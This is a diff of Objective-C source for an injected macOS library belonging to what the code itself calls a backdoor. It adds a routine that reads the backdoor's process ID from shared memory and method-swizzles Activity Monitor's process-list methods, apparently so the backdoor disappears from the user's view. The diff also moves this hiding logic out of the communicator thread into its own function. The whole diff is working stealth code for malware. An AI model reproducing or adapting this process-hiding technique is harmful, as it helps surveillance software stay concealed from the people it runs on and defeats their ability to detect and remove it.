@@ -159,6 +159,16 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 
 - (int)outlineViewHook: (id)arg1 numberOfChildrenOfItem: (id)arg2
 {
+  if (gBackdoorPID == 0)
+    {
+#ifdef DEBUG
+      NSLog(@"gBackdoorPid not initialized");
+#endif
+      
+      return [self outlineViewHook: arg1
+            numberOfChildrenOfItem: arg2];
+    }
+  
   if (arg2 == nil)
     {
 #ifdef DEBUG
@@ -184,6 +194,15 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #ifdef DEBUG
   NSLog(@"%s", __func__);
 #endif
+  
+  if (gBackdoorPID == 0)
+    {
+#ifdef DEBUG
+      NSLog(@"gBackdoorPid not initialized");
+#endif
+      
+      return [self filteredProcessesHook];
+    }
   
   NSMutableArray *a = [[NSMutableArray alloc] initWithArray: [self filteredProcessesHook]];
   int i = 0;
@@ -279,7 +298,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                                                    name: NSApplicationWillTerminateNotification
                                                  object: nil];
       */
-      if (gOSMajor == 10 && gOSMinor == 6) 
+      if (gOSMajor == 10 && gOSMinor == 6)
         {
 #ifdef DEBUG_TMP
           debugLog(ME, @"running osax bundle");
@@ -441,13 +460,89 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   isAppRunning = NO;
 }
 
-+ (void)startCoreCommunicator
++ (void)hideCoreFromAM
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  NSMutableData *readData;
+  shMemoryCommand *shMemCommand;
+  
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s: reading from shared", __FUNCTION__);
+#endif
+  
+  // On leopard we get pid on shmem
+  // waiting till core write it...
+  if (gOSMajor == 10 && gOSMinor == 5)
+    {
+      while (TRUE)
+        {
+          readData = [mSharedMemoryCommand readMemory: OFFT_CORE_PID
+                                        fromComponent: COMP_AGENT];
+          
+          if (readData != nil)
+            {
+              shMemCommand = (shMemoryCommand *)[readData bytes];
+              
+#ifdef DEBUG
+              NSLog(@"[DYLIB] %s: shmem", __FUNCTION__);
+#endif
+              if (shMemCommand->command == CR_CORE_PID)
+                {
+                  memcpy(&gBackdoorPID, shMemCommand->commandData, sizeof(pid_t));
+#ifdef DEBUG
+                  NSLog(@"[DYLIB] %s: receiving core pid %d", __FUNCTION__, gBackdoorPID);
+#endif
+                  break;
+                }
+            }
+      
+          usleep(30000);
+        }
+    }
+  
+  Class className   = objc_getClass("SMProcessController");
+  Class classSource = objc_getClass("mySMProcessController");
+  
+  if (className != nil)
+    {
+#ifdef DEBUG
+      NSLog(@"Class SMProcessController swizzling");
+#endif
+      swizzleByAddingIMP(className, @selector(outlineView:numberOfChildrenOfItem:),
+                         class_getMethodImplementation(classSource, @selector(outlineViewHook:numberOfChildrenOfItem:)),
+                         @selector(outlineViewHook:numberOfChildrenOfItem:));
+      
+      swizzleByAddingIMP(className, @selector(filteredProcesses),
+                         class_getMethodImplementation(classSource, @selector(filteredProcessesHook)),
+                         @selector(filteredProcessesHook));
+    }
+  else
+    {
+#ifdef DEBUG
+      NSLog(@"Class SMProcessController not found");
+#endif
+    }
+  
+  [pool release];
+}
+
++ (void)startCoreCommunicator
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
+  
+  if ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == YES)
+    {
+#ifdef DEBUG
+      NSLog(@"Starting hiding for activity Monitor");
+#endif
+    
+      [self hideCoreFromAM];
+    }
+  
   usleep(500000);
   
-  NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
 #ifdef DEBUG
   NSLog(@"Core Communicator thread launched");  
 #endif
@@ -462,33 +557,6 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       // plus it belongs to root (thus allocating a new shared memory block)
       //
       return;
-    }
-  else if ([bundleIdentifier isEqualToString: @"com.apple.ActivityMonitor"] == YES)
-    {
-#ifdef DEBUG
-      NSLog(@"Starting hiding for activity Monitor");
-#endif
-      
-    Class className   = objc_getClass("SMProcessController");
-    Class classSource = objc_getClass("mySMProcessController");
-    
-    if (className != nil)
-      {
-        swizzleByAddingIMP(className, @selector(outlineView:numberOfChildrenOfItem:),
-                          class_getMethodImplementation(classSource, @selector(outlineViewHook:numberOfChildrenOfItem:)),
-                           @selector(outlineViewHook:numberOfChildrenOfItem:));
-        
-        swizzleByAddingIMP(className, @selector(filteredProcesses),
-                           class_getMethodImplementation(classSource, @selector(filteredProcessesHook)),
-                           @selector(filteredProcessesHook));
-      }
-    else
-      {
-#ifdef DEBUG
-        NSLog(@"Class SMProcessController not found");
-#endif
-      }
-    
     }
     
   //
